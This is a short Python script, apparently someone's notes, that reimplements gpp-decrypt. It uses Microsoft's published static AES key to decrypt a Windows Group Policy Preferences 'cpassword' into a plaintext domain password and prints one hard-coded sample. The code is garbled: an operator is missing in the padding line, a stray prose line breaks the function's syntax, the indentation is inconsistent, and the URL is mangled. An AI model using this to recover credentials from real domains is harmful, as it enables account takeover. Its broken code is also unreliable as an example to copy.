#  I Lost my password 
# preloaded tool in kali: gppdecrypt: encrypted_data

from Crypto.Cipher import AES
import base64

block_size = 16     #Size of a data block (in bytes) https://www.pycrypto.org/api/current/Crypto.Cipher.AESmodule.html

def decrypt_cpassword(s):
     padding = '=' * (4  len(s) % 4)
    cpassword_base64 = s + padding      #устанавливаем размер %4
    cpassword = base64.b64decode(cpassword_base64)
    
     key = b'\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b'   #key for xml: https://learn.microsoft.com/enus/openspecs/windows_protocols/msgppref/2c15cbf0f0864c748b701f2fa45dd4be
    cipher = AES.new(key, AES.MODE_CBC, iv = b'\x00' * block_size)      #Create a new AES
    cipher (base64 returned by CBC mode) (idk how to identify padding, so enum)

    plaintext = cipher.decrypt(cpassword)
    return plaintext.decode('utf16')

print(decrypt_cpassword('PCXrmCkYWyRRx3bf+zqEydW9/trbFToMDx6fAvmeCDw'))